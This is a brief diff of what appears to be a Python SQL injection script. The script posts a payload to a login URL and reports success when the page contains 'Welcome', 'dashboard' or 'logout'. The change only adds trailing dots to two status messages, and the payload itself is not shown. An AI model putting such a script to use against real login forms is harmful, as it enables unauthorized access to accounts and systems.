@@ -10,6 +10,6 @@ payload = {
 response = requests.post(url, data=payload)
 
 if response.status_code == 200 and ("Welcome" in response.text or "dashboard" in response.text or "logout" in response.text):
-    print(f"[+] SQL Injection Successful with payload:")
+    print(f"[+] SQL Injection Successful with payload:......")
 else:
-    print("[-] Injection Failed!! Server response did not indicate success.")
+    print("[-] Injection Failed!! Server response did not indicate success......")
